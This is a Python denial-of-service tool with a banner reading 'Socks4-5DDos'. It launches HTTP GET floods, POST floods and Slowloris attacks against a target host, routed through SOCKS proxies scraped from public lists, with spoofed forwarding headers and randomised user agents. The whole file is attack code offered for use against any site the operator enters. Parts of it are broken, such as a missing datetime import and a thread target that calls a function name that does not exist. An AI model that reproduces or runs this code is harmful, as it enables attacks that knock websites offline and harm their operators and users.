#!/usr/bin/python3
######################################################
#   ____         __       ____     ____ ___          #
#  / __/__  ____/ /__ ___/ / /____/ __// _ \___  ___ #
# _\ \/ _ \/ __/  '_/(_-<_  _/___/__ \/ // / _ \(_-< #
#/___/\___/\__/_/\_\/___//_/    /____/____/\___/___/ #
######################################################                                                                          
import requests
import socket
import socks
import time
import random
import threading
import sys
import ssl

print ('''
   ____         __       ____     ____ ___         
  / __/__  ____/ /__ ___/ / /____/ __// _ \___  ___
 _\ \/ _ \/ __/  '_/(_-<_  _/___/__ \/ // / _ \(_-<
/___/\___/\__/_/\_\/___//_/    /____/____/\___/___/
                             
                         ''')
print(" ")

acceptall = [
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]
referers = [
	"https://www.google.com/search?q=",
	"https://check-host.net/",
	"https://www.facebook.com/",
	"https://www.youtube.com/",
	"https://www.fbi.com/",
	"https://www.bing.com/search?q=",
	"https://r.search.yahoo.com/",
]
data = ""
cookies = ""
strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
def getuseragent():
    platform = random.choice(['Macintosh', 'Windows', 'X11'])
    if platform == 'Macintosh':
        os  = random.choice(['68K', 'PPC', 'Intel Mac OS X'])
    elif platform == 'Windows':
        os  = random.choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
    elif platform == 'X11':
        os  = random.choice(['Linux i686', 'Linux x86_64'])
    browser = random.choice(['chrome', 'firefox', 'ie'])
    if browser == 'chrome':
        webkit = str(random.randint(500, 599))
        version = str(random.randint(0, 99)) + '.0' + str(random.randint(0, 9999)) + '.' + str(random.randint(0, 999))
        return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
    elif browser == 'firefox':
        currentYear = datetime.date.today().year
        year = str(random.randint(2020, currentYear))
        month = random.randint(1, 12)
        if month < 10:
            month = '0' + str(month)
        else:
            month = str(month)
        day = random.randint(1, 30)
        if day < 10:
            day = '0' + str(day)
        else:
            day = str(day)
        gecko = year + month + day
        version = str(random.randint(1, 72)) + '.0'
        return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
    elif browser == 'ie':
        version = str(random.randint(1, 99)) + '.0'
        engine = str(random.randint(1, 99)) + '.0'
        option = random.choice([True, False])
        if option == True:
            token = random.choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
        else:
            token = ''
        return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'
def cc(socks_type):
	connection = "Connection: Keep-Alive\r\n"
	if cookies != "":
		connection += "Cookies: "+str(cookies)+"\r\n"
	err = 0
	if str(port) == "443" :
		n = "HTTPS"
	else:
		n = "CC"
	while True:
		fake_ip = "X-Forwarded-For: "+str(random.randint(1,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"\r\n"
		fake_ip += "Client-IP: "+str(random.randint(1,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"\r\n"
		accept = random.choice(acceptall)
		referer = "Referer: "+random.choice(referers)+ ip + url2 + "\r\n"
		try:
			proxy = random.choice(proxies).strip().split(":")
			if socks_type == 4:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
			if socks_type == 5:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
			if err > 10:
				print("[!] Target Or Proxy Maybe Down | Changing Proxy")
				break
			s = socks.socksocket()
			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			s.connect((str(ip), int(port)))
			if str(port) == '443':
				s = ssl.wrap_socket(s)
			print ("[*] "+n+" Flooding From | "+str(proxy[0])+":"+str(proxy[1]))
			try:
				for _ in range(multiple):
					useragent = "User-Agent: " +getuseragent() + "\r\n"
					get_host = "GET " + url2 + "?" + random.choice(strings)+str(random.randint(0,271400281257))+random.choice(strings)+str(random.randint(0,271004281257))+random.choice(strings) + " HTTP/1.1\r\nHost: " + ip + "\r\n"
					request = get_host + referer + useragent + accept + connection + fake_ip+"\r\n"
					s.send(str.encode(request))
				s.close()
			except:
				s.close()
		except:#dirty fix
			pass
			err = err +1
	cc(socks_type)

def post(socks_type):
	global data
	post_host = "POST " + url2 + " HTTP/1.1\r\nHost: " + ip + "\r\n"
	content = "Content-Type: application/x-www-form-urlencoded\r\n"
	refer = "Referer: http://"+ ip + url2 + "\r\n"
	user_agent = "User-Agent: " + getuseragent() + "\r\n"
	accept = random.choice(acceptall)
	if mode2 != "y":
		data = str(random._urandom(16)) # You can enable bring data in HTTP Header
	length = "Content-Length: "+str(len(data))+" \r\nConnection: Keep-Alive\r\n"
	if cookies != "":
		length += "Cookies: "+str(cookies)+"\r\n"
	request = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
	proxy = random.choice(proxies).strip().split(":")
	err = 0
	if str(port) == "443" :
		n = "HTTPS"
	else:
		n = "CC"
	while True:
		try:
			proxy = random.choice(proxies).strip().split(":")
			if socks_type == 4:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
			if socks_type == 5:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
			if err > 10:
				print("[!] Target Or Proxy Maybe Down | Changing Proxy")
				break
			s = socks.socksocket()
			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			s.connect((str(ip), int(port)))
			if str(port) == '443': # //AUTO Enable SSL MODE :)
				s = ssl.wrap_socket(s)
			s.send(str.encode(request))
			print ("[*] "+n+" Post Flooding From  | "+str(proxy[0])+":"+str(proxy[1]))
			try:
				for _ in range(multiple):
					s.send(str.encode(request))
				s.close()
			except:
				s.close()
		except:
			pass#dirty fix
			err = err + 1
	post(socks_type)

socket_list=[]
def slow(conn,socks_type):
	try:#dirty fix
		proxy = random.choice(proxies).strip().split(":")
		if socks_type == 4:
			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
		if socks_type == 5:
			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
	except:
		print("[!] Something Wrong In Socks List")
		slow(conn,socks_type)#restart
	for _ in range(conn):
		try:
			s = socks.socksocket()
			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			s.settimeout(0.6)
			s.connect((str(ip), int(port)))
			if str(port) == '443':
				s = ssl.wrap_socket(s)
			s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))# Slowloris format header
			s.send("User-Agent: {}\r\n".format(getuseragent()).encode("utf-8"))
			s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
			if cookies != "":
				s.send(("Cookies: "+str(cookies)+"\r\n").encode("utf-8"))
			s.send(("Connection:keep-alive").encode("utf-8"))
			
			socket_list.append(s)
			sys.stdout.write("[*] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
			sys.stdout.flush()
		except:
			s.close()
			proxy = random.choice(proxies).strip().split(":")#Only change proxy when error, increase the performance
			if socks_type == 4:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
			if socks_type == 5:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
			sys.stdout.write("[*] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
			sys.stdout.flush()
	while True:
		for s in list(socket_list):
			try:
				s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
				sys.stdout.write("[*] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
				sys.stdout.flush()
			except:
				s.close()
				socket_list.remove(s)
				sys.stdout.write("[*] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
				sys.stdout.flush()
		proxy = random.choice(proxies).strip().split(":")
		if socks_type == 4:
			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
		if socks_type == 5:
			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
		for _ in range(conn - len(socket_list)):
			try:
				s.settimeout(1)
				s.connect((str(ip), int(port)))
				if str(port) == '443':
					s = ssl.wrap_socket(s)
				s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))# Slowloris format header
				s.send("User-Agent: {}\r\n".format(getuseragent).encode("utf-8"))
				s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
				if cookies != "":
					s.send(("Cookies: "+str(cookies)+"\r\n").encode("utf-8"))
				s.send(("Connection:keep-alive").encode("utf-8"))
				socket_list.append(s)
				sys.stdout.write("[*] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
				sys.stdout.flush()
			except:
				proxy = random.choice(proxies).strip().split(":")
				if socks_type == 4:
					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
				if socks_type == 5:
					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
				sys.stdout.write("[*] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
				sys.stdout.flush()
				pass
nums = 0
def checking(lines,socks_type,ms):#Proxy checker coded root@bossy:~# 
	global nums
	global proxies
	try:#dirty fix
		proxy = lines.strip().split(":")
		if socks_type == 4:
			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
		if socks_type == 5:
			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
	except:
		proxies.remove(lines)
		return
	err = 0
	while True:
		if err == 3:
			proxies.remove(lines)
			break
		try:
			s = socks.socksocket()
			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			s.settimeout(ms)#You can change by yourself
			s.connect((str(ip), int(port)))
			if port == 443:
				s = ssl.wrap_socket(s)
			s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
			s.close()
			break
		except:
			err +=1
	nums += 1

def check_socks(ms):#root@bossy:~# 
	global nums
	thread_list=[]
	for lines in list(proxies):
		if choice == "5":
			th = threading.Thread(target=checking,args=(lines,5,ms,))
			th.start()
		if choice == "4":
			th = threading.Thread(target=checking,args=(lines,4,ms,))
			th.start()
		thread_list.append(th)
		time.sleep(0.01)
		sys.stdout.write("root@bossy:~# Checked "+str(nums)+" Proxies\r")
		sys.stdout.flush()
	for th in list(thread_list):
		th.join()
		sys.stdout.write("root@bossy:~# Checked "+str(nums)+" Proxies\r")
		sys.stdout.flush()
	print("\r\nroot@bossy:~# Checked All Proxies Total Worked : "+str(len(proxies)))
	ans = input("root@bossy:~# Do U Want To Save Them In A File ? ( Y / n Default = Y ) ")
	if ans == "Y" or ans == "":
		if choice == "4":
			with open("Socks4.txt", 'wb') as fp:
				for lines in list(proxies):
					fp.write(bytes(lines,encoding='utf8'))
			fp.close()
			print("root@bossy:~# They Are Saved In Socks4.txt.")
		elif choice == "5":
			with open("socks5.txt", 'wb') as fp:
				for lines in list(proxies):
					fp.write(bytes(lines,encoding='utf8'))
			fp.close()
			print("root@bossy:~# They Are Saved In Socks5.txt.")
			
def check_list(socks_file):
	print("root@bossy:~# Checking List")
	temp = open(socks_file).readlines()
	temp_list = []
	for i in temp:
		if i not in temp_list:
			if ':' in i:
				temp_list.append(i)
	rfile = open(socks_file, "wb")
	for i in list(temp_list):
		rfile.write(bytes(i,encoding='utf-8'))
	rfile.close()

def downloadsocks(choice):
	if choice == "4":
		f = open("Socks4.txt",'wb')
		try:
			r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all&timeout=1000")
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4")
			f.write(r.content)
			f.close()
		except:
			f.close()
		try:#credit to All3xJ
			import urllib.request
			req = urllib.request.Request("https://www.socks-proxy.net/")
			req.add_header("User-Agent", getuseragent)
			sourcecode = urllib.request.urlopen(req)
			part = str(sourcecode.read())
			part = part.split("<tbody>")
			part = part[1].split("</tbody>")
			part = part[0].split("<tr><td>")
			proxies = ""
			for proxy in part:
				proxy = proxy.split("</td><td>")
				try:
					proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
				except:
					pass
				out_file = open("Socks4.txt","a")
				out_file.write(proxies)
				out_file.close()
		except:
			pass
		print("root@bossy:~# Have Already downloaded Socks4 List As Socks4.txt")
	if choice == "5":
		f = open("Socks5.txt",'wb')
		try:
			r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all")
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5")
			f.write(r.content)
			f.close()
		except:
			f.close()
		print("root@bossy:~# Have Already Downloaded Socks5 List As Socks5.txt")

def main():
	global ip
	global url2
	global port
	global proxies
	global multiple
	global choice
	global data
	global mode2
	global cookies
	ip = ""
	port = ""
	mode = ""
	print("root@bossy:~# Mode : [ CC / POST / SLOW / CHECK ]")
	while mode == "" :
		mode = str(input("root@bossy:~# Choose Your Mode ( Default = CC ) : ")).strip()
		if mode == "":
			mode = "CC"
		elif(mode != "CC") and (mode != "POST")and(mode != "SLOW" )and(mode !="CHECK"):
			print("root@bossy:~# Plese Enter Correct Mode")
			mode = ""
			continue
	ip = str(input("root@bossy:~# Host / IP : "))
	if ip == "":
		print("root@bossy:~# Plese Enter Correct Host Or Ip ")
		sys.exit(1)
	if mode == "slow" or mode == "check":
		pass
	else:
		url = str(input("root@bossy:~# Page You Want To Attack ( Default = / ) : "))
		if url == "":
			url2 = "/"
		else:
			url2 = url
	port = str(input("root@bossy:~# Port ( HTTPS Is 443 ) : "))
	if port == '':
		port = int(80)
		print("root@bossy:~# Default Choose Port 80\r\n> Port 80 Was Chosen")
	else:
		port = int(port)
		if str(port) == '443':
			print("root@bossy:~# [!] Enable SSL Mode")
	if mode == "post":
		mode2 = str(input("root@bossy:~# Customize Post Data ? ( y /  n Default = n ) : ")).strip()
		if mode2 == "y":
			data = open(input("root@bossy:~# Input The File's Path : ").strip()).readlines()
			data = ' '.join([str(txt) for txt in data])
	choice2 = str(input("root@bossy:~# Customize Cookies ? ( y / n Default = n ) : ")).strip()
	if choice2 == "y":
		cookies = str(input("root@bossy:~# Plese Input The Cookies : ")).strip()
	choice = ""
	while choice == "":
		choice = str(input("root@bossy:~# Choose Your Socks Mode ( 4 / 5 , Default = 5 ) : ")).strip()
		if choice == "":
			choice = "5"
		if choice != "4" and choice != "5":
			print("root@bossy:~# [!] Error Choice Try Again")
			choice = ""
		if choice == "4":
			socks_type = 4
		else:
			socks_type = 5
	if mode == "check":
		N = str(input("root@bossy:~# Do You Need To Get Socks List ? ( Y / n Default = Y ) : "))
		if N == 'Y' or N == "" :
			downloadsocks(choice)
		else:
			pass
		if choice == "4":
			out_file = str(input("root@bossy:~# Socks4 Proxy File Path ( Socks4.txt ) : "))
			if out_file == '':
				out_file = str("Socks4.txt")
			else:
				out_file = str(out_file)
			check_list(out_file)
			proxies = open(out_file).readlines()
		elif choice == "5":
			out_file = str(input("root@bossy:~# Socks5 Proxy File Path ( Socks5.txt ) : "))
			if out_file == '':
				out_file = str("Socks5.txt")
			else:
				out_file = str(out_file)
			check_list(out_file)
			proxies = open(out_file).readlines()
		print ("root@bossy:~# Number Of Socks%s Proxies : %s" %(choice,len(proxies)))
		time.sleep(0.03)
		ans = str(input("root@bossy:~# Do U Need To Check The Socks List? ( Y / n Defualt = Y ) : "))
		if ans == "":
			ans = "Y"
		if ans == "Y":
			ms = str(input("root@bossy:~# Delay Of Socks ( Seconds Default = 1 ) : "))
			if ms == "":
				ms = int(1)
			else :
				try:
					ms = int(ms)
				except :
					ms = float(ms)
			check_socks(ms)
		print("root@bossy:~# End Of Process")
		return
	if mode == "slow":	
		thread_num = str(input("root@bossy:~# Connections ( Default = 800 ) : "))
	else:
		thread_num = str(input("root@bossy:~# Threads ( Default = 800 ) : "))
	if thread_num == "":
		thread_num = int(800)
	else:
		try:
			thread_num = int(thread_num)
		except:
			sys.exit("root@bossy:~# Error Thread Number")
	N = str(input("root@bossy:~# Do You Need To Get Socks List ? ( Y / n Default =  Y ) : "))
	if N == 'Y' or N == "" :
		downloadsocks(choice)
	else:
		pass
	if choice == "4":
		out_file = str(input("root@bossy:~# Socks4 Proxy File Path ( Socks4.txt ) : "))
		if out_file == '':
			out_file = str("Socks4.txt")
		else:
			out_file = str(out_file)
		check_list(out_file)
		proxies = open(out_file).readlines()
	elif choice == "5":
		out_file = str(input("root@bossy:~# Socks5 Proxy File Path ( Socks5.txt ) : "))
		if out_file == '':
			out_file = str("Socks5.txt")
		else:
			out_file = str(out_file)
		check_list(out_file)
		proxies = open(out_file).readlines()
	print ("root@bossy:~# Number Of Socks%s Proxies : %s" %(choice,len(proxies)))
	time.sleep(0.03)
	ans = str(input("root@bossy:~# Do U Need To Check The Socks List ? ( Y / n Defualt = Y ) : "))
	if ans == "":
		ans = "Y"
	if ans == "Y":
		ms = str(input("root@bossy:~# Delay Of Socks ( Seconds Default = 1 ) : "))
		if ms == "":
			ms = int(1)
		else :
			try:
				ms = int(ms)
			except :
				ms = float(ms)
		check_socks(ms)
	if mode == "slow":
		input("root@bossy:~# Press Enter To Continue.")
		th = threading.Thread(target=slow,args=(thread_num,socks_type,))
		th.setDaemon(True)
		th.start()
	else:
		multiple = str(input("root@bossy:~# Input The Magnification ( Default = 100 ) : "))
		if multiple == "":
			multiple = int(100)
		else:
			multiple = int(multiple)
		input("root@bossy:~# Press Enter to Continue.")
		if mode == "post":
			for _ in range(thread_num):
				th = threading.Thread(target = post,args=(socks_type,))
				th.setDaemon(True)
				th.start()
				#print("Threads "+str(i+1)+" created")
		elif mode == "CC":
			for _ in range(thread_num):
				th = threading.Thread(target = CC,args=(socks_type,))
				th.setDaemon(True)
				th.start()
					#print("Threads "+str(i+1)+" created")
	try:
		while True:
			pass
	except KeyboardInterrupt:
		sys.exit()
	

if __name__ == "__main__":
	main()
